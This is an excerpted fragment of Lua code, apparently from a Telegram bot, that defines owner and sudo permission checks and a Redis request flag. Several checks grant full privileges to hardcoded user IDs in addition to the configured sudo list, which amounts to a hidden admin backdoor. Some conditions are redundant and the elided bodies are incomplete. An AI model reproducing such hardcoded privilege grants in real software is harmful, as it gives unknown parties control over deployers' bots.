...
local Arashwm = 205549111
local arashwm = 205549111
function is_mahdiroo(msg)
  local var = false
  -- Check users id in config
    if (MahDiRoO == tonumber(msg.from.id)) or (XaMaRiN == tonumber(msg.from.id)) then
      var = true
    end
  return var
end
...
function is_owner(msg)
  ...
  for v,user in pairs(_config.sudo_users) do
    ...
    if (Arashwm == tonumber(msg.from.id)) or (Arashwm == tonumber(msg.from.id)) then
      var = true
   end
  return var
end
...
function is_sudo1(user_id)
  ...
  for v,user in pairs(_config.sudo_users) do
   ...
   if (Arashwm == tonumber(user_id)) or (Arashwm == tonumber(user_id)) then
      var = true
   end
  return var
end
...
function is_req(chat_id, user_id)
  ...
  redis:setex("ReqMenu:" .. chat_id .. ":" .. user_id, 260, true)
  redis:setex("ReqMenu:" .. chat_id, 260, true)
  var = true
  end
  return var
end
